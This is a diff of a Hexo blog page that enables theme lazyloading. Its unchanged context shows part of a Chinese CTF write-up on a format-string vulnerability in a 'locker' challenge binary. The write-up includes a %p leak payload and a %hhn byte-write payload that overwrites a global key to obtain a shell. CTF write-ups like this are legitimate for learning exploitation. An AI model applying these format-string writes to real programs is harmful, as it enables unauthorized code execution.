@@ -21,7 +21,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
     KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
@@ -218,7 +218,12 @@
         
 
         <div class="article-content markdown-body">
-            <h2 id="程序保护和流程"><a href="#程序保护和流程" class="headerlink" title="程序保护和流程"></a>程序保护和流程</h2><p><img src="/images/image-20210923182009674.png" alt="image-20210923182009674"></p>
+            <h2 id="程序保护和流程"><a href="#程序保护和流程" class="headerlink" title="程序保护和流程"></a>程序保护和流程</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210923182009674.png"
+                      alt="image-20210923182009674"
+                ></p>
 <p>啥都没开</p>
 <h3 id="反汇编代码"><a href="#反汇编代码" class="headerlink" title="反汇编代码"></a>反汇编代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  locker();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -228,11 +233,21 @@
 
 <p>看程序栈 fgets 达不到栈溢出的要求，然后调用了 imagemagic 的函数其实就是调用 printf，第一反应就是格式化字符串漏洞(我中途想着想着就想到栈迁移劫持程序流，我是傻逼)</p>
 <p>然后就是要是 key==35795746 的话就可以 getshell 了。key 是 bss 段上的全局变量会在不等于的时候打印出地址和值</p>
-<p><img src="/images/image-20210923182825042.png" alt="image-20210923182825042"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210923182825042.png"
+                      alt="image-20210923182825042"
+                ></p>
 <h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>首先使用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;aaaa_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20210923183220492.png" alt="image-20210923183220492"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210923183220492.png"
+                      alt="image-20210923183220492"
+                ></p>
 <p>得出偏移量为 12，但是要是直接搞进去的话程序直接崩溃了。</p>
 <h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>按照字节写入</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(key_addr)+p32(key_addr+<span class="number">1</span>)+p32(key_addr+<span class="number">2</span>) + \</span><br><span class="line">    p32(key_addr+<span class="number">3</span>)+<span class="string">b&quot;%18c%12$hhn%17c%13$hhn%239c%14$hhn%224c%15$hhn&quot;</span></span><br></pre></td></tr></table></figure>
@@ -548,6 +563,8 @@
     <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
 
 
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
 
 
 <div class="post-scripts">
